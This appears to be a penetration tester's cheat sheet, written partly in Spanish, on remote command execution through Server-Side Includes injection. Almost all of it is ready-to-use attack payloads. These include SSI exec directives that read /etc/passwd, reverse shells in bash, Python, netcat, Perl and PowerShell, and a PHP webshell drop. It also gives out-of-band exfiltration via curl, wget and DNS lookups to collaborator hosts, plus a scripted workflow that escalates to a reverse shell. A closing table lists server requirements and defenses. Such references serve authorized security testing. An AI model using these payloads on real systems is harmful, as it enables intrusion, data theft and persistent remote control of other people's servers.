---
aliases:
  - SSI exec cmd
  - SSI RCE
  - SSI Reverse Shell
  - SSI OOB
tags:
  - vuln/ssi
  - technique/execution
  - asset/web-app
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[Server-Side Includes (SSI) Injection]]"
---
# SSI - Ejecución de Comandos

---

## RCE Linux / Windows Básico

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| RCE Linux `id` | `<!--#exec cmd="id" -->` | Standard probe. |
| RCE Linux `whoami` | `<!--#exec cmd="whoami" -->` | Same. |
| RCE Linux `uname -a` | `<!--#exec cmd="uname -a" -->` | Kernel info. |
| RCE Windows `whoami` | `<!--#exec cmd="whoami" -->` | Cross-platform. |
| RCE Windows `dir` | `<!--#exec cmd="dir C:\\" -->` | Windows-specific. |
| RCE PowerShell | `<!--#exec cmd="powershell.exe -enc <base64>" -->` | Encoded payloads. |
| Listar files | `<!--#exec cmd="ls -la /" -->` | Filesystem. |
| Read /etc/passwd | `<!--#exec cmd="cat /etc/passwd" -->` | Direct. |
| Combine SSI + bash chain | `<!--#exec cmd="id; whoami; hostname" -->` | Multi-cmd. |
| `cmd` with single quotes | `<!--#exec cmd='id' -->` | If `"` filtered. |
| `cmd` without quotes | `<!--#exec cmd=id -->` | Some parsers tolerate. |
| Combine con `cgi=` | `<!--#exec cgi="/cgi-bin/foo" -->` | Less common. |
| Verbose output | `<!--#exec cmd="ls -la /; cat /etc/passwd" -->` | Multi-line. |
^ssi-exec-basic

---

## Reverse Shells

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Bash reverse shell | `<!--#exec cmd="bash -c 'bash -i >& /dev/tcp/<IP>/<PORT> 0>&1'" -->` | Standard. |
| Bash con `&` shorthand | `<!--#exec cmd="bash >& /dev/tcp/<IP>/<PORT> 0>&1" -->` | Variant. |
| Python reverse shell | `<!--#exec cmd="python3 -c 'import socket,pty,os;s=socket.socket();s.connect((\"<IP>\",<PORT>));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn(\"sh\")'" -->` | If python3 available. |
| Python2 fallback | `python -c '...'` con `pty.spawn("/bin/sh")` | Older systems. |
| Netcat shell | `<!--#exec cmd="nc <IP> <PORT> -e /bin/sh" -->` | If `nc` installed con `-e`. |
| Netcat sin `-e` | `<!--#exec cmd="rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> <PORT> >/tmp/f" -->` | FIFO trick. |
| Perl shell | `<!--#exec cmd="perl -e 'use Socket;$i=\"<IP>\";$p=<PORT>;socket(S,...);'" -->` | If Perl. |
| PHP shell drop | `<!--#exec cmd="echo '<?php system(\$_GET[c]); ?>' > /var/www/html/sh.php" -->` | Webshell drop. |
| PowerShell reverse | `<!--#exec cmd="powershell -nop -c 'IEX(New-Object Net.WebClient).downloadString(\"http://<IP>/rev.ps1\")'" -->` | Windows. |
| Listener setup | Atacante: `nc -lvnp <PORT>` | Pre-step. |
| Combine con base64 | Encode complex command in base64 | Bypass character filters. |
| Persistencia post-shell | Add SSH key, cron, service | Post-RCE. |
^ssi-exec-revshell

---

## OOB Exfil (Blind RCE)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| HTTP callback | `<!--#exec cmd="curl http://<collab>/?d=$(id\|base64)" -->` | Standard. |
| HTTP callback raw | `<!--#exec cmd="wget http://<collab>/?d=$(whoami)" -->` | Alt. |
| DNS exfil (nslookup) | `<!--#exec cmd="nslookup $(whoami).<collab>.oastify.com" -->` | DNS-only egress. |
| DNS via dig | `<!--#exec cmd="dig $(whoami).<collab>.oastify.com" -->` | Same. |
| Time delay (blind) | `<!--#exec cmd="sleep 10" -->` | Confirm exec. |
| Conditional time delay | `<!--#exec cmd="if [ $(id -u) = 0 ]; then sleep 10; fi" -->` | Boolean oracle. |
| Burp Collaborator | Use `<id>.oast.fun` | Auto-track. |
| interactsh | Self-host alternative | Free. |
| Base64 exfil | Encode large output | Avoid char issues. |
| chunked exfil | Loop con multiple curls per chunk | For large data. |
| Combine con shell | OOB confirms RCE → upgrade to reverse shell | Standard chain. |
| TCP raw exfil | `bash -c 'cat /etc/passwd > /dev/tcp/<IP>/<PORT>'` | Bash TCP. |
^ssi-exec-oob

### Standard SSI OOB workflow

```bash
# 1. Setup Burp Collaborator or interactsh-client
COLLAB="<unique>.oast.fun"

# 2. Inject probe
PAYLOAD='<!--#exec cmd="curl http://'$COLLAB'/?d=$(id|base64 -w0)" -->'

# 3. Send via vulnerable input
curl --data-urlencode "q=$PAYLOAD" https://target/search.shtml

# 4. Watch Collaborator dashboard
# Atacante recibe HTTP request con base64-encoded `id` output

# 5. Decode
echo "<base64>" | base64 -d
# uid=33(www-data) gid=33(www-data) groups=33(www-data)

# 6. Confirm RCE → escalate to reverse shell
PAYLOAD='<!--#exec cmd="bash -c \"bash -i >& /dev/tcp/<IP>/4444 0>&1\"" -->'
```

---

## Requisitos para que `#exec` Funcione

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Apache `mod_include` enabled | `apachectl -M | grep include` | Server-side. |
| `Options +Includes` activo | `.htaccess` o vhost config | Or via probe. |
| `+IncludesNOEXEC` flag | If set → `#exec` blocked, `#include` works | Common defense. |
| File extension `.shtml` | Or custom MIME type | Standard. |
| Target user | Webserver user (www-data, apache, IUSR) | Permissions. |
| If `+IncludesNOEXEC` | Use `#include` fallback (see Inclusión de Archivos) | Standard. |
| If `mod_include` disabled | SSI not parsed at all | Vector dead. |
| If `.shtml` not handled | Will return raw HTML | Vector dead. |
| Defense check | Server config audit reveals | Per-app. |
| IIS configuration | SSI via handler mappings | IIS-specific. |
^ssi-exec-requirements

---
